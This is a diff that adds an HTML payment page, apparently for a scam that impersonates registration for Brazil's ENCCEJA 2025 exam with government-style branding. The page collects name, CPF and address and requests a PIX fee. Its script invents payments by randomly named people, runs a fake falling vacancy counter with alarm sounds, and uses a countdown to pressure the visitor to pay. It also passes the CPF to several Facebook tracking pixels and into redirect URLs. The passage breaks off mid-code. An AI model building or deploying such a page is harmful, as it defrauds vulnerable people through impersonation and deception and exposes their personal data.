@@ -1,0 +1,1224 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>ENCCEJA 2025 - Pagamento</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Verificação de dispositivo desktop -->
+
+    <!-- Facebook Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1418766538994503');
+      fbq('init', '1345433039826605'); // Segundo pixel adicionado
+      fbq('init', '1390026985502891'); // Terceiro pixel adicionado
+      fbq('init', '190097557439571');  // Quarto pixel adicionado
+      fbq('init', '1226790281278977'); // Quinto pixel adicionado
+      fbq('track', 'PageView');
+    </script>
+    <noscript>
+      <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1418766538994503&ev=PageView&noscript=1"/>
+      <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1345433039826605&ev=PageView&noscript=1"/>
+      <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1390026985502891&ev=PageView&noscript=1"/>
+      <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=190097557439571&ev=PageView&noscript=1"/>
+      <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1226790281278977&ev=PageView&noscript=1"/>
+    </noscript>
+    <!-- End Facebook Pixel Code -->
+    <style>
+        .gov-header {
+            background-color: #222222;
+        }
+        .inep-header {
+            background-color: #044785;
+        }
+        .form-header {
+            background-color: #2c5985;
+            color: white;
+            font-weight: 600;
+        }
+        .btn-primary {
+            background-color: #5d85ab;
+            color: white;
+            transition: all 0.2s ease;
+        }
+        .btn-primary:hover {
+            background-color: #4d7396;
+        }
+        .footer-bg {
+            background-color: #1c2b39;
+        }
+        .pix-container {
+            border: 2px dashed #ddd;
+            background-color: #f9f9f9;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Estilo para as notificações de pagamento */
+        .notification {
+            font-size: 13px;
+            padding: 10px 15px;
+            border-radius: 6px;
+            background-color: #1e3a8a;
+            color: white;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            margin: 10px 0;
+            opacity: 0;
+            transform: translateY(-20px);
+            animation: slideDown 0.3s forwards, fadeOut 0.5s 5.5s forwards;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            border-left: 4px solid #4ade80;
+            max-width: 90%;
+            position: relative;
+        }
+        
+        /* Estilo para as notificações de alerta */
+        .alert-notification {
+            background-color: #D90000;
+            animation: slideDown 0.3s forwards, fadeOut 0.5s 6.5s forwards;
+            box-shadow: 0 4px 12px rgba(255, 0, 0, 0.25);
+            font-weight: bold;
+            max-width: 90%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            border-left: 4px solid #4ade80;
+        }
+        
+        /* Animação de piscar o texto */
+        .blinking-text {
+            animation: blink 1s ease-in-out infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+        
+        /* Estilo para o contador de tempo */
+        .countdown {
+            font-weight: bold;
+            color: #E53E3E;
+            font-size: 1.1em;
+        }
+        
+        .notification-icon {
+            margin-right: 10px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; transform: translateY(-20px); }
+        }
+        
+        /* Estes estilos foram movidos para acima */
+    </style>
+    
+    <!-- Adicionar arquivos de áudio para notificações -->
+    <audio id="notification-sound" preload="auto">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3" type="audio/mp3">
+        <source src="https://cdn.pixabay.com/download/audio/2021/08/04/audio_0625c1539c.mp3?filename=message-notification-tone-4-126506.mp3" type="audio/mp3">
+    </audio>
+    <audio id="notification-sound-alt" preload="auto">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-bell-notification-933.mp3" type="audio/mp3">
+    </audio>
+    <audio id="alert-sound" preload="auto">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3" type="audio/mp3">
+    </audio>
+    <audio id="alert-sound-alt" preload="auto">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-software-interface-alert-2573.mp3" type="audio/mp3">
+    </audio>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log("Inicializando página de pagamento");
+            
+            // Iniciar o contador regressivo de 10 minutos
+            startCountdown();
+            
+            // Tentar obter os dados do pagamento
+            const paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+            const userData = JSON.parse(localStorage.getItem('cpfData') || '{}');
+            const addressData = JSON.parse(localStorage.getItem('enderecoData') || '{}');
+            
+            console.log("Dados carregados:", { 
+                paymentData, 
+                userData, 
+                addressData 
+            });
+            
+            // Verificar dados disponíveis e usar a melhor fonte
+            const nome = paymentData.nome || userData.nome || '';
+            const cpf = paymentData.cpf || userData.cpf || '';
+            const telefone = paymentData.telefone || addressData.telefone || '';
+            
+            // Se ainda não tiver os dados mínimos necessários
+            if (!nome || !cpf) {
+                console.error("Dados insuficientes para pagamento");
+                alert("Dados de pagamento incompletos. Você será redirecionado para o início da inscrição.");
+                window.location.href = '/inscricao';
+                return;
+            }
+            
+            // Reconstruir o objeto com os dados disponíveis
+            const dadosPagamento = { nome, cpf, telefone };
+            
+            // Atualizar o localStorage com a versão consolidada
+            localStorage.setItem('paymentData', JSON.stringify(dadosPagamento));
+            
+            // Atualizar os dados do usuário na interface
+            document.getElementById('user-name').textContent = nome;
+            document.getElementById('user-cpf').textContent = cpf;
+            
+            // Obter dados de endereço se disponíveis
+            const cidade = addressData.cidade || "Não informado";
+            const endereco = addressData.endereco || "";
+            const numero = addressData.numero || "";
+            const complemento = addressData.complemento || "";
+            const bairro = addressData.bairro || "";
+            const estado = addressData.estado || "";
+            const cep = addressData.cep || "";
+            
+            // Preencher cidade e endereço completo
+            document.getElementById('user-city').textContent = cidade;
+            
+            // Montar endereço completo
+            const enderecoCompleto = `${endereco}, ${numero}${complemento ? ', ' + complemento : ''} - ${bairro}, ${cidade} - ${estado}, CEP ${cep}`;
+            document.getElementById('user-address').textContent = enderecoCompleto;
+            
+            // Fazer solicitação para criar pagamento
+            createPayment(dadosPagamento);
+        });
+        
+        function createPayment(userData) {
+            // Exibir spinner enquanto processa
+            document.getElementById('loading-container').classList.remove('hidden');
+            document.getElementById('payment-container').classList.add('hidden');
+            
+            // Fazer requisição para criar o pagamento
+            fetch('/pagamento', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(userData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Esconder spinner
+                document.getElementById('loading-container').classList.add('hidden');
+                document.getElementById('payment-container').classList.remove('hidden');
+                
+                if (data.error) {
+                    // Mostrar erro se houver
+                    document.getElementById('error-message').textContent = data.error;
+                    document.getElementById('error-container').classList.remove('hidden');
+                    return;
+                } 
+                
+                if (data.warning) {
+                    // Mostrar alerta se houver, mas continuar processando
+                    document.getElementById('warning-message').textContent = data.warning;
+                    document.getElementById('warning-container').classList.remove('hidden');
+                }
+                
+                // Processar os dados de pagamento
+                    // Mostrar dados de pagamento
+                    console.log('Processando dados de pagamento:', data);
+                    
+                    // Verificar QR code (API Nova Era usa URL direta para QR code)
+                    if (data.qr_code) {
+                        console.log('QR code via URL recebido:', data.qr_code.substring(0, 50) + '...');
+                        
+                        // Verificar se é uma URL ou imagem em base64
+                        if (data.qr_code.startsWith('http')) {
+                            // É uma URL para imagem ou API QR
+                            document.getElementById('qr-code-img').src = data.qr_code;
+                            console.log('Usando QR code via URL externa');
+                        } else if (data.qr_code.startsWith('data:image')) {
+                            // É uma imagem base64
+                            document.getElementById('qr-code-img').src = data.qr_code;
+                            console.log('Usando QR code via dados base64');
+                        } else {
+                            // Tentar como base64 simples
+                            try {
+                                document.getElementById('qr-code-img').src = `data:image/png;base64,${data.qr_code.replace(/^['"]|['"]$/g, '').trim()}`;
+                                console.log('Usando QR code como base64 puro');
+                            } catch (e) {
+                                console.error('Erro ao processar QR code como base64:', e);
+                                // Fallback para serviço externo se tiver código PIX
+                                if (data.pix_code) {
+                                    const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix_code)}`;
+                                    document.getElementById('qr-code-img').src = qrApiUrl;
+                                    console.log('Usando serviço externo para gerar QR code');
+                                }
+                            }
+                        }
+                        
+                        // Adicionar tratamento de erro para a imagem
+                        const imgElement = document.getElementById('qr-code-img');
+                        imgElement.onerror = function() {
+                            console.error('Erro ao carregar QR code - imagem inválida');
+                            // Tentar com serviço externo se tivermos o código PIX
+                            if (data.pix_code) {
+                                const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix_code)}`;
+                                imgElement.src = qrApiUrl;
+                                console.log('Usando QR code alternativo via API após erro');
+                            } else {
+                                // Não temos código PIX, ocultar QR code
+                                document.getElementById('qr-code-container').classList.add('hidden');
+                            }
+                        };
+                        
+                        // Mostrar o container
+                        document.getElementById('qr-code-container').classList.remove('hidden');
+                        
+                    } else if (data.pix_code) {
+                        // Não temos QR code, mas temos código PIX
+                        console.log('Sem QR code na resposta, mas temos código PIX. Gerando QR via API externa...');
+                        const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix_code)}`;
+                        document.getElementById('qr-code-img').src = qrApiUrl;
+                        document.getElementById('qr-code-container').classList.remove('hidden');
+                    } else {
+                        // Não temos nem QR code nem código PIX
+                        console.error('Sem QR code e sem código PIX na resposta, verificando nomes alternativos...');
+                        
+                        // Tentar nomes alternativos para compatibilidade
+                        if (data.pixQrCode || data.pixCode) {
+                            const qrCode = data.pixQrCode;
+                            const pixCode = data.pixCode;
+                            
+                            if (qrCode) {
+                                document.getElementById('qr-code-img').src = qrCode;
+                                document.getElementById('qr-code-container').classList.remove('hidden');
+                                console.log('Usando QR code de campo alternativo (pixQrCode)');
+                            } else if (pixCode) {
+                                const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
+                                document.getElementById('qr-code-img').src = qrApiUrl;
+                                document.getElementById('qr-code-container').classList.remove('hidden');
+                                console.log('Gerando QR code a partir de campo alternativo (pixCode)');
+                            }
+                        } else {
+                            console.error('Sem QR code e sem código PIX em nenhum campo conhecido');
+                            document.getElementById('qr-code-container').classList.add('hidden');
+                        }
+                    }
+                    
+                    // Verificar código PIX para copiar e colar (adaptado para API NovaEra)
+                    if (data.pix_code) {
+                        document.getElementById('pix-code').textContent = data.pix_code;
+                        document.getElementById('pix-code-container').classList.remove('hidden');
+                        console.log('Código PIX disponível para cópia');
+                    } else if (data.pixCode) {
+                        // Compatibilidade com campo antigo
+                        document.getElementById('pix-code').textContent = data.pixCode;
+                        document.getElementById('pix-code-container').classList.remove('hidden');
+                        console.log('Código PIX disponível para cópia (campo alternativo)');
+                    } else {
+                        console.warn('Código PIX não disponível na resposta');
+                        document.getElementById('pix-code-container').classList.add('hidden');
+                    }
+                    
+                    // Salvar ID de transação para verificar status (compatível com NovaEra e For4Payments)
+                    let transactionId = data.id || data.transaction_id;
+                    if (transactionId) {
+                        localStorage.setItem('transactionId', transactionId);
+                        
+                        // Iniciar verificação periódica do status do pagamento
+                        startPaymentStatusCheck(transactionId);
+                        console.log('Iniciando verificação periódica de status para transação:', transactionId);
+                    } else {
+                        console.error('ID da transação não encontrado na resposta');
+                    }
+            })
+            .catch(error => {
+                // Esconder spinner e mostrar erro
+                document.getElementById('loading-container').classList.add('hidden');
+                document.getElementById('error-message').textContent = 'Erro ao processar pagamento. Tente novamente.';
+                document.getElementById('error-container').classList.remove('hidden');
+                console.error('Erro:', error);
+            });
+        }
+        
+        function copyPixCode() {
+            const pixCode = document.getElementById('pix-code').textContent;
+            navigator.clipboard.writeText(pixCode)
+                .then(() => {
+                    // Mostrar mensagem de sucesso
+                    const copyButton = document.getElementById('copy-button');
+                    const originalText = copyButton.innerHTML;
+                    copyButton.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
+                    copyButton.classList.remove('bg-green-600');
+                    copyButton.classList.add('bg-blue-600');
+                    
+                    // Voltar ao estado original após 2 segundos
+                    setTimeout(() => {
+                        copyButton.innerHTML = originalText;
+                        copyButton.classList.remove('bg-blue-600');
+                        copyButton.classList.add('bg-green-600');
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.error('Erro ao copiar:', err);
+                });
+        }
+        
+        // Variável para controlar o status de pagamento já confirmado
+        let paymentConfirmed = false;
+        
+        // Função para verificar o status do pagamento periodicamente
+        // Lista de nomes aleatórios para as notificações
+        const randomNames = [
+            "Maria Oliveira", "João Silva", "Ana Souza", "Carlos Santos", 
+            "Juliana Lima", "Roberto Almeida", "Fernanda Costa", "Lucas Pereira",
+            "Patricia Rodrigues", "Marcelo Gomes", "Luciana Ferreira", "Paulo Castro",
+            "Cristina Rocha", "Ricardo Barbosa", "Amanda Cardoso", "Bruno Martins",
+            "Camila Ribeiro", "Daniel Alves", "Vanessa Carvalho", "Thiago Nunes",
+            "Beatriz Mendes", "Gabriel Moreira", "Larissa Campos", "Rafael Dias",
+            "Isabela Teixeira", "Leandro Oliveira", "Carolina Lopes", "Gustavo Cunha",
+            "Natália Vieira", "Henrique Correia", "Mariana Duarte", "Felipe Nascimento",
+            "Renata Pinto", "Diego Machado", "Débora Azevedo", "Alexandre Moraes",
+            "Bianca Barros", "Marcos Neves", "Tatiana Freitas", "Leonardo Guimarães",
+            "Viviane Ramos", "Rodrigo Marques", "Aline Fernandes", "Vitor Andrade",
+            "Luiza Fonseca", "Guilherme Sales", "Jéssica Miranda", "Cláudio Gonçalves"
+        ];
+        
+        // Função para mostrar notificações de pagamento
+        // Função para iniciar o contador regressivo
+        function startCountdown() {
+            const countdownElement = document.getElementById('expiration-date');
+            // Definir o tempo total em segundos (10 minutos = 600 segundos)
+            let timeLeft = 600;
+            
+            // Atualizar o contador a cada segundo
+            const countdownInterval = setInterval(() => {
+                // Calcular minutos e segundos restantes
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                // Formatar a exibição (MM:SS)
+                const formattedTime = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                // Atualizar o elemento na página
+                countdownElement.textContent = formattedTime;
+                
+                // Quando faltar menos de 1 minuto, destacar o contador
+                if (timeLeft <= 60) {
+                    countdownElement.style.color = '#FF0000'; // Vermelho
+                    countdownElement.style.fontWeight = 'bold';
+                    countdownElement.style.fontSize = '1.25em';
+                }
+                
+                // Decrementar o tempo restante
+                timeLeft--;
+                
+                // Se o tempo acabou
+                if (timeLeft < 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = '00:00';
+                    
+                    // Exibir mensagem quando o tempo acabar
+                    const warningMessage = document.getElementById('warning-message');
+                    warningMessage.textContent = 'TEMPO ESGOTADO! O desconto promocional expirou. Efetue o pagamento imediatamente para garantir sua vaga.';
+                    document.getElementById('warning-container').classList.remove('hidden');
+                }
+            }, 1000);
+        }
+        
+        // Variável global para controlar o número de vagas disponíveis
+        let vagasDisponiveis = 34;
+        let notificacoesDesdeUltimoAlerta = 0;
+        
+        function showNotifications() {
+            const container = document.getElementById('notifications-container');
+            const notificationSound = document.getElementById('notification-sound');
+            const userCity = document.getElementById('user-city').textContent;
+            
+            // Obter bairro do endereço
+            const addressData = JSON.parse(localStorage.getItem('enderecoData') || '{}');
+            const bairro = addressData.bairro || "Centro";
+            
+            // Verificar se temos um bairro válido, caso contrário, usar um bairro padrão
+            const neighborhood = bairro || "Centro";
+            const city = userCity || "sua cidade";
+            
+            // Inicializar sons e garantir que eles estejam prontos para dispositivos móveis
+            let soundsInitialized = false;
+            
+            // Função para inicializar sons após interação do usuário
+            function initializeSounds() {
+                if (soundsInitialized) return;
+                
+                // Obter todos os elementos de áudio
+                const notificationSound = document.getElementById('notification-sound');
+                const notificationSoundAlt = document.getElementById('notification-sound-alt');
+                const alertSound = document.getElementById('alert-sound');
+                const alertSoundAlt = document.getElementById('alert-sound-alt');
+                
+                // Definir volume para todos
+                notificationSound.volume = 0.7;
+                notificationSoundAlt.volume = 0.7;
+                alertSound.volume = 0.8;
+                alertSoundAlt.volume = 0.8;
+                
+                // Carregar todos os sons (isto ajuda em dispositivos móveis)
+                notificationSound.load();
+                notificationSoundAlt.load();
+                alertSound.load();
+                alertSoundAlt.load();
+                
+                // Tocar e pausar imediatamente para "ativar" no iOS/Safari
+                try {
+                    notificationSound.play().then(() => {
+                        notificationSound.pause();
+                        notificationSound.currentTime = 0;
+                    }).catch(e => console.log('Erro na inicialização de som temporária:', e));
+                } catch (e) {
+                    console.log('Erro ao tentar inicializar sons:', e);
+                }
+                
+                // Marcar como inicializado
+                soundsInitialized = true;
+                console.log("Sons inicializados com sucesso!");
+                
+                // Ocultar o botão de inicialização manual se existir
+                const initButton = document.getElementById('sound-init-container');
+                if (initButton) {
+                    initButton.style.display = 'none';
+                }
+            }
+            
+            // Função para inicialização manual dos sons (via botão)
+            function initializeSoundsManually() {
+                initializeSounds();
+                
+                // Tentar tocar um som curto para confirmar
+                setTimeout(() => {
+                    playSound();
+                    // Mostrar feedback ao usuário
+                    alert("Sons inicializados com sucesso! Agora você ouvirá as notificações de pagamento.");
+                }, 100);
+            }
+            
+            // Adicionar listener para inicializar sons na primeira interação
+            document.addEventListener('click', initializeSounds, { once: true });
+            document.addEventListener('touchstart', initializeSounds, { once: true });
+            
+            // Função para reproduzir som de notificação
+            function playSound() {
+                if (!soundsInitialized) {
+                    initializeSounds();
+                    // Talvez não consiga tocar imediatamente após inicializar
+                    return;
+                }
+                
+                const notificationSound = document.getElementById('notification-sound');
+                
+                // Recarregar para garantir que pode ser tocado novamente
+                notificationSound.currentTime = 0;
+                
+                // Tentar tocar o som principal
+                notificationSound.play().catch(e => {
+                    console.error("Erro ao tocar som de notificação:", e);
+                    
+                    // Tentar com som alternativo
+                    const notificationSoundAlt = document.getElementById('notification-sound-alt');
+                    notificationSoundAlt.currentTime = 0;
+                    notificationSoundAlt.play().catch(e2 => {
+                        console.error("Erro no fallback de som de notificação:", e2);
+                    });
+                });
+            }
+            
+            // Função para reproduzir som de alerta (diferente)
+            function playAlertSound() {
+                if (!soundsInitialized) {
+                    initializeSounds();
+                    // Talvez não consiga tocar imediatamente após inicializar
+                    return;
+                }
+                
+                const alertSound = document.getElementById('alert-sound');
+                
+                // Recarregar para garantir que pode ser tocado novamente
+                alertSound.currentTime = 0;
+                
+                // Tentar tocar o som de alerta
+                alertSound.play().catch(e => {
+                    console.error("Erro ao tocar som de alerta:", e);
+                    
+                    // Tentar com som alternativo
+                    const alertSoundAlt = document.getElementById('alert-sound-alt');
+                    alertSoundAlt.currentTime = 0;
+                    alertSoundAlt.play().catch(e2 => {
+                        console.error("Erro no fallback de som de alerta:", e2);
+                    });
+                });
+            }
+            
+            function showRandomNotification() {
+                // Verificar se já existe uma notificação ativa (para garantir que mostre apenas uma por vez)
+                if (container.querySelectorAll('.notification').length > 0) {
+                    // Se já existe uma notificação, tenta novamente mais tarde
+                    return;
+                }
+                
+                // Pegar um nome aleatório
+                const randomName = randomNames[Math.floor(Math.random() * randomNames.length)];
+                
+                // Criar elemento de notificação
+                const notification = document.createElement('div');
+                notification.className = 'notification';
+                notification.innerHTML = `
+                    <div class="notification-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                        </svg>
+                    </div>
+                    <div>
+                        <strong>${randomName}</strong> acabou de pagar a Taxa de Inscrição de <strong>R$43,40</strong> e garantiu sua vaga para a prova em <strong>${neighborhood}</strong>.
+                    </div>
+                `;
+                
+                // Adicionar ao container
+                container.appendChild(notification);
+                
+                // Tentar tocar o som
+                playSound();
+                
+                // Remover a notificação após 7 segundos (animação dura 6s + 1s para remoção segura)
+                setTimeout(() => {
+                    notification.remove();
+                }, 7000);
+                
+                // Incrementar contador de notificações desde último alerta
+                notificacoesDesdeUltimoAlerta++;
+                
+                // Verificar se é hora de mostrar um alerta de vagas
+                if (notificacoesDesdeUltimoAlerta >= 4) {
+                    // Reduzir vagas disponíveis a cada ciclo de alerta
+                    vagasDisponiveis -= notificacoesDesdeUltimoAlerta;
+                    
+                    // Garantir que nunca fique abaixo de 1
+                    if (vagasDisponiveis < 1) vagasDisponiveis = 1;
+                    
+                    // Resetar contador
+                    notificacoesDesdeUltimoAlerta = 0;
+                    
+                    // Mostrar alerta após um pequeno delay para não coincidir com outra notificação
+                    setTimeout(() => {
+                        showVagasAlert();
+                    }, 1000);
+                }
+            }
+            
+            function showVagasAlert() {
+                // Verificar se já existe uma notificação ativa (para garantir que mostre apenas uma por vez)
+                if (container.querySelectorAll('.notification').length > 0) {
+                    // Se já existe uma notificação, tenta novamente mais tarde
+                    return;
+                }
+                
+                // Criar elemento de alerta
+                const alertNotification = document.createElement('div');
+                alertNotification.className = 'notification alert-notification';
+                
+                // Definir mensagem com base no número de vagas
+                let mensagem = '';
+                if (vagasDisponiveis <= 5) {
+                    mensagem = `<strong>URGENTE:</strong> Apenas ${vagasDisponiveis} ${vagasDisponiveis === 1 ? 'vaga restante' : 'vagas restantes'} para ${city}! Realize o pagamento imediatamente para não perder sua vaga!`;
+                } else {
+                    mensagem = `<strong>ATENÇÃO:</strong> Restam apenas ${vagasDisponiveis} vagas para ${city}. Garanta sua vaga completando a inscrição agora!`;
+                }
+                
+                alertNotification.innerHTML = `
+                    <div class="notification-icon" style="background-color: rgba(255, 0, 0, 0.2);">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                        </svg>
+                    </div>
+                    <div>
+                        ${mensagem}
+                    </div>
+                `;
+                
+                // Adicionar estilos especiais para alerta
+                alertNotification.style.backgroundColor = '#D90000';
+                alertNotification.style.fontWeight = 'bold';
+                
+                // Adicionar ao container
+                container.appendChild(alertNotification);
+                
+                // Reproduzir som de alerta
+                playAlertSound();
+                
+                // Remover após 8 segundos (um pouco mais longo que as notificações normais)
+                setTimeout(() => {
+                    alertNotification.remove();
+                }, 8000);
+            }
+            
+            // Mostrar primeira notificação após 2 segundos
+            setTimeout(() => {
+                // Mostrar primeiro alerta de vagas
+                showVagasAlert();
+                
+                // Em seguida mostrar notificação normal após um breve delay
+                setTimeout(() => {
+                    showRandomNotification();
+                    
+                    // Configurar intervalos aleatórios para mostrar notificações
+                    setInterval(() => {
+                        // Intervalo aleatório entre 1-4 segundos
+                        const randomInterval = Math.floor(Math.random() * 3000) + 1000;
+                        setTimeout(showRandomNotification, randomInterval);
+                    }, 7000); // Intervalo principal entre ciclos de notificações
+                }, 8500);
+                
+            }, 2000);
+        }
+        
+        // Iniciar sistema de notificações após o carregamento da página
+        setTimeout(showNotifications, 3000);
+        
+        function startPaymentStatusCheck(transactionId) {
+            console.log('Iniciando verificação periódica do status de pagamento para ID:', transactionId);
+            
+            // Verificar imediatamente
+            checkPaymentStatus(transactionId);
+            
+            // Configurar verificação periódica a cada 10 segundos
+            const checkInterval = setInterval(() => {
+                // Se o pagamento já foi confirmado, interromper as verificações
+                if (paymentConfirmed) {
+                    console.log('Pagamento já confirmado, interrompendo verificações');
+                    clearInterval(checkInterval);
+                    return;
+                }
+                
+                checkPaymentStatus(transactionId);
+            }, 10000); // 10 segundos
+            
+            // Parar de verificar após 30 minutos (1800 segundos) para não consumir recursos
+            setTimeout(() => {
+                clearInterval(checkInterval);
+                console.log('Verificação de pagamento encerrada após 30 minutos');
+            }, 1800000);
+        }
+        
+        // Função para verificar o status do pagamento no servidor
+        function checkPaymentStatus(transactionId) {
+            console.log('Verificando status do pagamento...');
+            
+            fetch('/verificar-pagamento', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ transactionId: transactionId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Status do pagamento:', data);
+                console.log('Status recebido:', data.status);
+                
+                // Se o pagamento foi aprovado/confirmado (verificando tanto status quanto original_status)
+                // Compatibilidade com NovaEra ('paid', 'completed') e For4Payments ('PAID', 'COMPLETED', 'APPROVED')
+                if (data.status === 'PAID' || data.status === 'COMPLETED' || 
+                    data.status === 'APPROVED' || data.status === 'paid' || 
+                    data.status === 'completed' || data.original_status === 'APPROVED' ||
+                    data.original_status === 'PAID' || data.original_status === 'COMPLETED') {
+                    
+                    console.log('PAGAMENTO VERIFICADO COMO PAGO!');
+                    console.log('Redirecionando para a página de agradecimento...');
+                    // Marcar como confirmado para parar as verificações
+                    paymentConfirmed = true;
+                    console.log('PAGAMENTO APROVADO! Preparando redirecionamento...');
+                    
+                    // Verificar se temos IDs de pixel para rastrear
+                    if (data.facebook_pixel_id) {
+                        console.log('Recebido ID(s) de Pixel para rastreamento de conversão:', data.facebook_pixel_id);
+                    }
+                    
+                    // Mostrar mensagem de sucesso
+                    const successMessage = document.createElement('div');
+                    successMessage.className = 'bg-green-50 p-4 rounded-md border border-green-300 text-green-800 my-4';
+                    successMessage.innerHTML = `
+                        <p class="flex items-start">
+                            <i class="fas fa-check-circle text-green-600 mr-2 mt-1"></i>
+                            <span>
+                                <strong>Pagamento confirmado!</strong> Sua inscrição foi concluída com sucesso.
+                                Redirecionando para a página de confirmação...
+                            </span>
+                        </p>
+                    `;
+                    
+                    // Adicionar mensagem ao container
+                    const paymentDetailsContainer = document.getElementById('payment-container');
+                    paymentDetailsContainer.insertBefore(successMessage, paymentDetailsContainer.firstChild);
+                    
+                    // Disparar evento de conversão no Facebook Pixel
+                    console.log('Disparando evento de conversão no Facebook Pixel');
+                    if (typeof fbq !== 'undefined') {
+                        // Obter dados do localStorage para o evento
+                        const userData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+                        const nome = userData.nome || '';
+                        const cpf = userData.cpf || '';
+                        
+                        // Definir dados do evento
+                        const eventData = {
+                            value: 39.70,
+                            currency: 'BRL',
+                            content_name: 'Taxa de Inscrição ENCCEJA 2025',
+                            content_type: 'product',
+                            content_ids: ['encceja-2025-taxa'],
+                            content_category: 'Taxa de Inscrição',
+                            user_data: {
+                                name: nome,
+                                external_id: cpf.replace(/\D/g, '')
+                            }
+                        };
+                        
+                        try {
+                            // Enviar para o pixel principal
+                            fbq('track', 'Purchase', eventData);
+                            console.log('Evento enviado para pixel principal 1418766538994503');
+                            
+                            // Enviar para os pixels específicos
+                            fbq('trackSingle', '1345433039826605', 'Purchase', eventData);
+                            console.log('Evento enviado para pixel 1345433039826605');
+                            
+                            fbq('trackSingle', '1390026985502891', 'Purchase', eventData);
+                            console.log('Evento enviado para pixel 1390026985502891');
+                            
+                            fbq('trackSingle', '190097557439571', 'Purchase', eventData);
+                            console.log('Evento enviado para pixel 190097557439571');
+                            
+                            fbq('trackSingle', '1226790281278977', 'Purchase', eventData);
+                            console.log('Evento enviado para pixel 1226790281278977');
+                        } catch (e) {
+                            console.error('Erro ao enviar evento para o pixel:', e);
+                        }
+                    } else {
+                        console.error('Facebook Pixel não disponível');
+                    }
+                    
+                    // Obter os dados do usuário para enviar para a página de destino
+                    const userData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+                    const nome = userData.nome || '';
+                    const cpf = userData.cpf || '';
+                    const telefone = userData.telefone || '';
+                    
+                    // Montar os parâmetros de URL para passar para a página de destino
+                    const urlParams = new URLSearchParams();
+                    if (nome) urlParams.append('nome', nome);
+                    if (cpf) urlParams.append('cpf', cpf);
+                    if (telefone) urlParams.append('phone', telefone);
+                    
+                    // Verificar se há um redirecionamento específico na resposta da API (caso do pagamento de R$ 143,10)
+                    if (data.redirect_to) {
+                        console.log('Redirecionamento específico detectado:', data.redirect_to);
+                        // Redirecionar para a URL específica retornada pela API
+                        window.location.href = data.redirect_to + '?' + urlParams.toString();
+                    } else {
+                        // Redirecionar para a página padrão de agradecimento
+                        if (data.redirect_to) {
+                        console.log('Redirecionamento específico detectado:', data.redirect_to);
